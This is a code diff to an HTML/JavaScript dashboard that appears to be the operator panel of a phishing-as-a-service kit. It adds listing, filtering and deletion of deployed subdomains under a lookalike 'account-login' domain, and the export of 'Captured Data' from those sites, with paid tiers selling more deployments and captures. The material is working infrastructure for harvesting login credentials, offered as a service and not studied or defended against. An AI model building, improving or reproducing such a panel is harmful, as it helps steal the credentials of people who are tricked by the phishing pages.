@@ -188,8 +188,22 @@
             </div>
         </div>
 
+        <!-- ACTIVE SITES -->
         <div class="section-header">
-            <h3>Captured Data</h3>
+            <h3>Active Sites</h3>
+        </div>
+        <div id="sites-list" style="margin-bottom: 40px; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px;">
+            <!-- Injected -->
+        </div>
+
+        <!-- CAPTURED DATA -->
+        <div class="section-header">
+            <div style="display:flex; align-items:center; gap:15px;">
+                <h3 style="margin:0;">Captured Data</h3>
+                <select id="site-filter" onchange="filterData()" style="padding: 6px; background: var(--bg-card); color: var(--text-main); border: 1px solid var(--border); border-radius: 6px;">
+                    <option value="all">All Sites</option>
+                </select>
+            </div>
             <div id="premium-actions" style="display:none;">
                 <button onclick="copyData()" class="btn-action">📋 Copy All</button>
                 <button onclick="downloadData()" class="btn-action">📥 Download JSON</button>
@@ -222,6 +236,7 @@
                     <ul style="font-size:0.85rem; padding-left:20px; color:var(--text-sec);">
                         <li>1 Deployment Max</li>
                         <li>5 Visible Captures (Latest)</li>
+                        <li>Standard SSL Encryption</li>
                         <li>Includes Ads</li>
                     </ul>
                 </div>
@@ -230,7 +245,8 @@
                     <ul style="font-size:0.85rem; padding-left:20px; color:var(--text-sec);">
                         <li>3 Deployments Max</li>
                         <li>15 Visible Captures (Latest)</li>
-                        <li>No Ads</li>
+                        <li>Extended Data Retention</li>
+                        <li>No Ads & SSL Encryption</li>
                     </ul>
                 </div>
                 <div style="padding:15px; background:rgba(0,0,0,0.2); border-radius:8px; border:1px solid var(--border);">
@@ -238,6 +254,7 @@
                     <ul style="font-size:0.85rem; padding-left:20px; color:var(--text-sec);">
                         <li>15 Deployments Max</li>
                         <li>Unlimited Captures</li>
+                        <li>Priority Traffic Routing</li>
                         <li>No Ads, Priority Support</li>
                     </ul>
                 </div>
@@ -294,8 +311,12 @@
 
                 if (result.success) {
                     currentData = result.data;
+                    const sites = result.sites || [];
+
                     updateUI(result);
-                    renderData(result.data);
+                    renderSites(sites);
+                    populateFilter(sites);
+                    renderData(currentData);
 
                     if (result.plan === 'free') {
                         triggerAds();
@@ -307,6 +328,48 @@
                 document.getElementById('loader').innerText = 'Network Error';
                 console.error(e);
             }
+        }
+
+        function renderSites(sites) {
+            const list = document.getElementById('sites-list');
+            list.innerHTML = '';
+
+            if (sites.length === 0) {
+                list.innerHTML = '<div style="color:var(--text-sec); grid-column:1/-1; text-align:center;">No sites deployed yet.</div>';
+                return;
+            }
+
+            sites.forEach(site => {
+                const url = `https://${site.subdomain}.account-login.co.za`;
+                const div = document.createElement('div');
+                div.style.background = 'var(--bg-card)';
+                div.style.border = '1px solid var(--border)';
+                div.style.borderRadius = 'var(--radius)';
+                div.style.padding = '20px';
+                div.style.position = 'relative';
+
+                div.innerHTML = `
+                    <div style="font-weight:bold; font-size:1.1rem; color:var(--text-main); margin-bottom:5px;">${site.subdomain}</div>
+                    <a href="${url}" target="_blank" style="color:var(--accent); font-size:0.9rem; text-decoration:none;">${url}</a>
+                    <div style="margin-top:15px; display:flex; gap:10px;">
+                        <button onclick="copyToClip('${url}')" style="flex:1; padding:8px; background:rgba(255,255,255,0.05); border:1px solid var(--border); color:var(--text-main); border-radius:6px; cursor:pointer;">Copy</button>
+                        <button onclick="deleteSite('${site.subdomain}')" style="flex:1; padding:8px; background:rgba(243,18,96,0.1); border:1px solid var(--danger); color:var(--danger); border-radius:6px; cursor:pointer;">Delete</button>
+                    </div>
+                `;
+                list.appendChild(div);
+            });
+        }
+
+        function populateFilter(sites) {
+            const select = document.getElementById('site-filter');
+            // Keep first option (All)
+            select.innerHTML = '<option value="all">All Sites</option>';
+            sites.forEach(s => {
+                const opt = document.createElement('option');
+                opt.value = s.subdomain;
+                opt.innerText = s.subdomain;
+                select.appendChild(opt);
+            });
         }
 
         function updateUI(data) {
@@ -417,19 +480,55 @@
             } catch(e) { notify("Error deleting", "error"); }
         }
 
+        async function deleteSite(subdomain) {
+            if(!confirm(`Delete site '${subdomain}'? This cannot be undone.`)) return;
+            try {
+                const res = await fetch(`${WORKER_URL}/api/public/sites?code=${encodeURIComponent(userCode)}&subdomain=${encodeURIComponent(subdomain)}`, { method: 'DELETE' });
+                const data = await res.json();
+                if(data.success) {
+                    notify("Site deleted", "success");
+                    loadDashboard();
+                } else {
+                    notify(data.error, "error");
+                }
+            } catch(e) { notify("Error deleting site", "error"); }
+        }
+
+        function copyToClip(text) {
+            navigator.clipboard.writeText(text).then(() => notify("Copied to clipboard", "success"));
+        }
+
+        function filterData() {
+            const filter = document.getElementById('site-filter').value;
+            let filtered = currentData;
+
+            if (filter !== 'all') {
+                filtered = currentData.filter(item => {
+                    const d = item.data || {};
+                    const url = d.url || '';
+                    return url.includes(`//${filter}.`);
+                });
+            }
+            renderData(filtered);
+        }
+
         // --- EXPORT ---
-        function getSafeData() {
-            // Remove uniqueCode from export
-            return currentData.map(item => {
+        function getSafeData(filterVal) {
+            let items = currentData;
+            if (filterVal && filterVal !== 'all') {
+                items = currentData.filter(item => {
+                    const d = item.data || {};
+                    const url = d.url || '';
+                    return url.includes(`//${filterVal}.`);
+                });
+            }
+
+            const captures = items.map(item => {
                 const cleanItem = { ...item };
-                // If data has uniqueCode, clean it deep
                 if (cleanItem.data && typeof cleanItem.data === 'object') {
-                    // Create a copy of the inner data
                     const cleanInner = { ...cleanItem.data };
-                    // Remove known key names for the code
                     delete cleanInner.uniqueCode;
                     delete cleanInner.ownerCode;
-                    // Also generic check if any value matches the actual code
                     Object.keys(cleanInner).forEach(k => {
                         if (cleanInner[k] === userCode) delete cleanInner[k];
                     });
@@ -437,21 +536,30 @@
                 }
                 return cleanItem;
             });
+
+            return {
+                header: "PREASX24 - X24 SYSTEM",
+                source: filterVal === 'all' ? "All Active Sites" : `https://${filterVal}.account-login.co.za`,
+                captures: captures,
+                footer: "POWERED BY DTECH"
+            };
         }
 
         function downloadData() {
-            const safeData = getSafeData();
+            const filter = document.getElementById('site-filter').value;
+            const safeData = getSafeData(filter);
             const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(safeData, null, 2));
             const a = document.createElement('a');
             a.href = dataStr;
-            a.download = "captures_safe.json";
+            a.download = filter === 'all' ? "captures_all.json" : `captures_${filter}.json`;
             document.body.appendChild(a);
             a.click();
             a.remove();
         }
 
         function copyData() {
-            const safeData = getSafeData();
+            const filter = document.getElementById('site-filter').value;
+            const safeData = getSafeData(filter);
             navigator.clipboard.writeText(JSON.stringify(safeData, null, 2))
                 .then(() => notify("Copied to clipboard (Sensative code removed)", "success"));
         }
